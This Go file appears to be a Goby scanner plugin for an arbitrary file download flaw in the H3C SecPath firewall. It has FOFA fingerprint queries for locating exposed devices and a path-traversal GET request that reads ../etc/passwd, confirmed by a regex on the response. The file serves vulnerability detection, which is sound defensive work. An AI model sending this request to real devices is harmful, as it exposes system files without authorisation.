package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "H3C SecPath 下一代防火墙 任意文件下载漏洞",
    "Description": "<p>H3C SecPath 下一代防火墙是新华三技术有限公司开发的新一代专业防火墙设备。支持外部攻击防范、内网安全、流量监控等功能。</p><p>H3C SecPath 下一代防火墙存在任意文件下载漏洞，攻击者可以可使用该漏洞读取设备的重要文件。</p>",
    "Product": "H3C SecPath 下一代防火墙",
    "Homepage": "http://www.h3c.com/cn/",
    "DisclosureDate": "2021-06-18",
    "Author": "",
    "FofaQuery": "((body=\"class=\\\"dl_margin0\\\" align=\\\"left\\\">Web网管用户登录</div>\" && body=\"/php/common/checknum_creat.php?module=config_authnum\")) && body=\"webui/js/jquerylib/jquery-1.7.2.min.js\"",
    "GobyQuery": "((body=\"class=\\\"dl_margin0\\\" align=\\\"left\\\">Web网管用户登录</div>\" && body=\"/php/common/checknum_creat.php?module=config_authnum\")) && body=\"webui/js/jquerylib/jquery-1.7.2.min.js\"",
    "Level": "1",
    "Impact": "<p>H3C SecPath 下一代防火墙存在任意文件下载漏洞，攻击者可以可使用该漏洞读取设备的重要文件。</p>",
    "VulType": [
        "文件读取"
    ],
    "Tags": [
        "文件读取"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5.6",
    "Is0day": false,
    "Recommendation": "<p>官⽅暂未修复该漏洞，请关注厂商主页更新：<a href=\"http://www.h3c.com/cn/\">http://www.h3c.com/cn/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
    "Translation": {
        "CN": {
            "Name": "H3C SecPath 下一代防火墙 任意文件下载漏洞",
            "Description": "<p>H3C SecPath 下一代防火墙是新华三技术有限公司开发的新一代专业防火墙设备。支持外部攻击防范、内网安全、流量监控等功能。</p><p>H3C SecPath 下一代防火墙存在任意文件下载漏洞，攻击者可以可使用该漏洞读取设备的重要文件。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请关注厂商主页更新：<a href=\"http://www.h3c.com/cn/\" rel=\"nofollow\">http://www.h3c.com/cn/</a></p><br><br><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>H3C SecPath 下一代防火墙存在任意文件下载漏洞，攻击者可以可使用该漏洞读取设备的重要文件。</p>",
            "Tags": [
                "文件读取"
            ],
            "VulType": [
                "文件读取"
            ]
        }
    },
    "References": [
        "https://www.pwnwiki.org/index.php?title=H3C_SecPath_%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E7%89%86_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BC%89%E6%BC%8F%E6%B4%9E/zh-cn"
    ],
    "HasExp": false,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/?g=sys_dia_data_down&file_name=../etc/passwd",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*?:\\d:\\d:\\w*:(.*?)sh",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9929"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
